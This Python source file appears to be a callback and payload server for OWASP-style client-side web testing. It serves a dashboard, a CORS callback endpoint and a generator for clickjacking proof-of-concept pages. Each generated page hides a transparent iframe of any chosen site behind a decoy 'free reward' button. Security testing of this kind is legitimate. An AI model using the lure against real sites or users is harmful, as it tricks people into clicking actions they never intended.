#!/usr/bin/env python3
"""
WSTG-CLNT Callback Suite  –  server.py
One-shot launcher:  python3 server.py [--port 8000] [--host 0.0.0.0]

Routes
  GET  /                           → index.html dashboard
  GET  /events                     → SSE stream (log + hit-count events)
  GET  /api/hits                   → JSON snapshot of per-path hit counts
  GET  /api/cj-list                → JSON list of generated clickjacking PoC files
  POST /api/generate-cj            → { target, label } → writes PoC HTML, returns { file, url }
  POST /api/cors-callback          → echo origin, used by CLNT-07 XHR probe
  GET  /payloads/*                 → static payload files
"""

import argparse
import json
import os
import queue
import threading
import time
import urllib.parse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn

# ── Paths ────────────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "server.log")
PAYLOADS = os.path.join(BASE_DIR, "payloads")

# ── Shared state ─────────────────────────────────────────────────────────────
_hit_lock = threading.Lock()
_hits: dict = {}

_sse_lock = threading.Lock()
_sse_clients: list = []


def _broadcast(line: str):
    with _sse_lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait(line)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_clients.remove(q)


def _log(path: str, status: int, remote: str, method: str, extra: str = ""):
    ts  = datetime.now().strftime("%H:%M:%S")
    msg = f"[{ts}]  {remote:<18}  {method:<7}  {status}  {path}"
    if extra:
        msg += f"  »  {extra}"
    with _hit_lock:
        _hits[path] = _hits.get(path, 0) + 1
    with open(LOG_FILE, "a") as fh:
        fh.write(msg + "\n")
    _broadcast(msg)
    print(msg, flush=True)


# ── Threaded server ───────────────────────────────────────────────────────────
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# ── Request handler ───────────────────────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_):
        pass  # suppress default stderr spam

    # ---------- CORS headers -------------------------------------------------
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()
        _log(self.path, 204, self.client_address[0], "OPTIONS")

    # ---------- SSE stream ---------------------------------------------------
    def _sse_stream(self):
        q = queue.Queue(maxsize=300)
        with _sse_lock:
            _sse_clients.append(q)
        self.send_response(200)
        self.send_header("Content-Type",  "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Accel-Buffering", "no")
        self._cors()
        self.end_headers()
        try:
            # Send current hit snapshot immediately
            with _hit_lock:
                snap = dict(_hits)
            self._sse_write("hits", snap)
            while True:
                try:
                    line = q.get(timeout=20)
                    self._sse_write("log", {"line": line})
                    with _hit_lock:
                        snap = dict(_hits)
                    self._sse_write("hits", snap)
                except queue.Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        finally:
            with _sse_lock:
                try:
                    _sse_clients.remove(q)
                except ValueError:
                    pass

    def _sse_write(self, event: str, data):
        payload = json.dumps(data).encode()
        self.wfile.write(b"event: " + event.encode() + b"\ndata: " + payload + b"\n\n")
        self.wfile.flush()

    # ---------- Static file --------------------------------------------------
    def _serve_file(self, local_path: str, content_type: str = "text/html; charset=utf-8"):
        try:
            with open(local_path, "rb") as fh:
                data = fh.read()
            self.send_response(200)
            self.send_header("Content-Type",   content_type)
            self.send_header("Content-Length", str(len(data)))
            self._cors()
            self.end_headers()
            self.wfile.write(data)
            return 200
        except FileNotFoundError:
            self.send_response(404)
            self._cors()
            self.end_headers()
            self.wfile.write(b"404 - file not found")
            return 404

    # ---------- Clickjacking PoC generator -----------------------------------
    def _generate_cj(self, target: str, label: str) -> str:
        safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in label)[:40]
        fname = f"cj_{safe}_{int(time.time())}.html"
        out   = os.path.join(PAYLOADS, "clnt-09-clickjacking", fname)

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Clickjacking PoC – {label}</title>
<style>
:root {{
  --bg:#0d1117; --fg:#c9d1d9; --accent:#58a6ff;
  --green:#3fb950; --border:#30363d; --card:#161b22;
}}
* {{ box-sizing:border-box; margin:0; padding:0; }}
body {{ font-family:monospace; background:var(--bg); color:var(--fg); padding:1.5rem; }}
h1   {{ color:var(--accent); font-size:1.1rem; margin-bottom:.5rem; }}
.meta {{ font-size:.8rem; color:#8b949e; margin-bottom:1rem; }}
.wrap {{
  position:relative; width:800px; height:600px;
  border:2px dashed var(--accent); border-radius:4px; overflow:hidden;
}}
iframe {{
  position:absolute; top:0; left:0; width:100%; height:100%;
  opacity:0.0001; z-index:10;
  border:none;
}}
.decoy {{
  position:absolute; top:0; left:0; width:100%; height:100%;
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  background:var(--card); gap:1rem; pointer-events:none;
}}
.btn-fake {{
  background:#1f6feb; color:#fff; border:none; padding:.6rem 2rem;
  border-radius:6px; font-size:1rem; cursor:pointer;
}}
.controls {{ margin-top:1rem; display:flex; gap:.5rem; align-items:center; flex-wrap:wrap; }}
button {{
  background:var(--card); color:var(--accent); border:1px solid var(--border);
  padding:.35rem .9rem; cursor:pointer; font-family:monospace; border-radius:3px;
}}
button:hover {{ background:var(--border); }}
#status {{ font-size:.85rem; color:var(--green); }}
.note {{ margin-top:1rem; font-size:.8rem; color:#8b949e; max-width:800px; line-height:1.5; }}
</style>
</head>
<body>
<h1>⚡ Clickjacking PoC</h1>
<p class="meta">Label: <strong>{label}</strong> &nbsp;|&nbsp; Target: <code>{target}</code></p>

<div class="wrap">
  <div class="decoy">
    <div style="font-size:1.2rem">🎁 Claim your free reward!</div>
    <button class="btn-fake">Click here to continue</button>
  </div>
  <iframe id="victim" src="{target}"></iframe>
</div>

<div class="controls">
  <button onclick="toggleOpacity()">Toggle iframe visibility</button>
  <button onclick="removeDecoy()">Remove decoy overlay</button>
  <span id="status">Loading…</span>
</div>

<p class="note">
  ⚠️  <strong>PoC usage:</strong> If the iframe loads the target page and clicking the invisible iframe
  triggers actions on the target, the site is vulnerable to clickjacking.
  Missing <code>X-Frame-Options</code> or permissive <code>Content-Security-Policy: frame-ancestors</code>
  are the typical root causes.
</p>

<script>
var opaque = false;
document.getElementById('victim').addEventListener('load', function() {{
  document.getElementById('status').textContent = '✓ iframe loaded – site did not block framing';
  document.getElementById('status').style.color = '#f85149';
}});
document.getElementById('victim').addEventListener('error', function() {{
  document.getElementById('status').textContent = '✗ iframe blocked or failed to load';
}});
function toggleOpacity() {{
  opaque = !opaque;
  document.getElementById('victim').style.opacity = opaque ? '1' : '0.0001';
  document.getElementById('status').textContent = opaque ? '[iframe visible – move over decoy to see overlay]' : '[iframe invisible – click area is still active]';
}}
function removeDecoy() {{
  var d = document.querySelector('.decoy');
  if (d) d.remove();
}}
</script>
</body>
</html>
"""
        os.makedirs(os.path.dirname(out), exist_ok=True)
        with open(out, "w") as fh:
            fh.write(html)
        return fname

    # ---------- GET routing --------------------------------------------------
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"
        remote = self.client_address[0]

        if path == "/events":
            _log(path, 200, remote, "GET", "SSE client connected")
            self._sse_stream()
            return

        if path == "/api/hits":
            with _hit_lock:
                snap = dict(_hits)
            data = json.dumps(snap).encode()
            self.send_response(200)
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(data)))
            self._cors()
            self.end_headers()
            self.wfile.write(data)
            _log(path, 200, remote, "GET")
            return

        if path == "/api/cj-list":
            cj_dir = os.path.join(PAYLOADS, "clnt-09-clickjacking")
            try:
                files = sorted(f for f in os.listdir(cj_dir)
                               if f.startswith("cj_") and f.endswith(".html"))
            except FileNotFoundError:
                files = []
            data = json.dumps(files).encode()
            self.send_response(200)
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(data)))
            self._cors()
            self.end_headers()
            self.wfile.write(data)
            _log(path, 200, remote, "GET")
            return

        if path == "/":
            status = self._serve_file(os.path.join(BASE_DIR, "index.html"))
            _log("/", status, remote, "GET")
            return

        # Static files under project root
        local = os.path.realpath(os.path.join(BASE_DIR, parsed.path.lstrip("/")))
        if not local.startswith(BASE_DIR):
            self.send_response(403)
            self.end_headers()
            _log(parsed.path, 403, remote, "GET", "path traversal blocked")
            return

        # A directory request (e.g. the CLNT-09 generator at /payloads/clnt-09-clickjacking/)
        # serves its own index.html, same as any static file server - without this,
        # open()'ing a directory raises IsADirectoryError and the connection just dies.
        if os.path.isdir(local):
            local = os.path.join(local, "index.html")

        ext_map = {
            ".html": "text/html; charset=utf-8",
            ".js":   "application/javascript",
            ".css":  "text/css",
            ".json": "application/json",
            ".txt":  "text/plain",
            ".png":  "image/png",
            ".svg":  "image/svg+xml",
        }
        _, ext = os.path.splitext(local)
        ctype  = ext_map.get(ext.lower(), "application/octet-stream")
        status = self._serve_file(local, ctype)
        _log(parsed.path, status, remote, "GET")

    # ---------- POST routing -------------------------------------------------
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path
        remote = self.client_address[0]
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)

        if path == "/api/generate-cj":
            try:
                data   = json.loads(body)
                target = data.get("target", "").strip()
                label  = data.get("label",  "target").strip()
                if not target:
                    raise ValueError("target URL is required")
                fname  = self._generate_cj(target, label)
                resp   = json.dumps({
                    "file": fname,
                    "url":  f"/payloads/clnt-09-clickjacking/{fname}"
                }).encode()
                self.send_response(200)
                self.send_header("Content-Type",   "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self._cors()
                self.end_headers()
                self.wfile.write(resp)
                _log(path, 200, remote, "POST", f"generated → {fname}")
            except Exception as exc:
                msg = str(exc).encode()
                self.send_response(400)
                self._cors()
                self.end_headers()
                self.wfile.write(msg)
                _log(path, 400, remote, "POST", str(exc))
            return

        if path.startswith("/api/cors-callback"):
            origin  = self.headers.get("Origin", "(none)")
            ua      = self.headers.get("User-Agent", "")[:80]
            resp    = json.dumps({
                "received": True,
                "origin":   origin,
                "note":     "CORS callback hit – your XHR reached this server"
            }).encode()
            self.send_response(200)
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(resp)))
            self._cors()
            self.end_headers()
            self.wfile.write(resp)
            _log(path, 200, remote, "POST", f"origin={origin}")
            return

        self.send_response(404)
        self.end_headers()
        _log(path, 404, remote, "POST", "no route matched")


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="WSTG-CLNT Callback Suite")
    parser.add_argument("--host", default="0.0.0.0",  help="bind address (default: 0.0.0.0)")
    parser.add_argument("--port", default=8000, type=int, help="port (default: 8000)")
    args = parser.parse_args()

    os.makedirs(os.path.join(PAYLOADS, "clnt-09-clickjacking"), exist_ok=True)
    open(LOG_FILE, "a").close()

    server = ThreadedHTTPServer((args.host, args.port), Handler)
    url    = f"http://127.0.0.1:{args.port}/"

    print(f"\n  ╔══════════════════════════════════════════════╗")
    print(f"  ║  WSTG-CLNT Callback Suite                    ║")
    print(f"  ╠══════════════════════════════════════════════╣")
    print(f"  ║  Dashboard  →  {url:<29} ║")
    print(f"  ║  Log file   →  {LOG_FILE[-29:]:<29} ║")
    print(f"  ║  Ctrl+C to stop                              ║")
    print(f"  ╚══════════════════════════════════════════════╝\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down cleanly.")
        server.shutdown()


if __name__ == "__main__":
    main()
